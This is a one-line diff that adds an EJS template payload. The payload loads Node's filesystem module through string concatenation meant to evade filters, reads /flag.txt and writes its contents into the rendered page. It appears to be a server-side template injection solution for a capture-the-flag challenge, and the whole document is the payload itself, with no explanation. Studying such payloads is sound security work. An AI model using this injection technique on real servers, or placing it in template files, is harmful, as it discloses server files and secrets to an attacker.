@@ -1,0 +1,1 @@
+<% var m=globalThis.process.getBuiltinModule("f"+"s");__append(m["read"+"FileSync"]("/f"+"lag.txt")) %>
